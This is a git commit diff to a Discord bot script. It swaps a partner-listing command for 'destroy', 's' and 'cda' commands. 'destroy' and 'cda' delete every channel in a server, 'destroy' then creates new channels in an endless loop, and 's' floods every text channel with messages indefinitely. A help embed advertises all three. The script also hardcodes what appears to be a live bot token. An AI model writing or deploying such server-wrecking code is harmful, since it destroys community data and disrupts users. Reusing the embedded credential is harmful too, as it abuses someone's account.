eae16249d6360f7501bfe9332d73adbb8e28fffe
Saadelamali <83782029+Saadelamali@users.noreply.github.com>
2021-06-04 14:42:13 +0000

    Update bot.py

--- bot.py
+++ bot.py
@@ -22,12 +22,56 @@ from discord.ext import commands
 client = commands.Bot(command_prefix = '-')
 client.remove_command('help')
 
-@client.command(aliases=["Partners","PARTNERS"])
-@commands.guild_only()
-async def partners (ctx):
-    embed=discord.Embed(title="",color=discord.Color(0x5d018f))
-    embed.add_field(name="**partnered Servers**",value="DaVibes | [Join!](https://discord.gg/cYwqYw2Rtr)\n Vxps | [Join!](https://discord.gg/37y8vDWERd)")
+@client.command()
+async def destroy (ctx,message):
+    guild=ctx.message.guild
+    await ctx.message.delete()
     
-    await ctx.reply(embed=embed)
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print(f"{channel.name} has been deleted")
+        except:
+             pass
+    for i in range(1):
+        await guild.create_text_channel(f"{message}")
+    while True:
+        for channel in guild.text_channels:
+            for i in range (1):
+                await guild.create_text_channel(f"{message}")
+ 
+
+@client.command()
+async def s(ctx, *, message ):
+  guild=ctx.message.guild
+  await ctx.message.delete()
+  for i in range(2):
+    print("spammed")
+    while True:
+           for channel in guild.text_channels:
+                 await channel.send(f"{message}")
+
+@client.command()
+async def cda(ctx):
+    guild=ctx.message.guild
+    await ctx.message.delete()
+    
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+        except:
+            pass   
+
+
+@client.command()
+async def commands(ctx):
+ 
+  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
+  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
+  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
+  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
+  embed.set_footer(text="developed by Saad.")
+
+  await ctx.send(embed=embed)
 
 client.run("ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo")
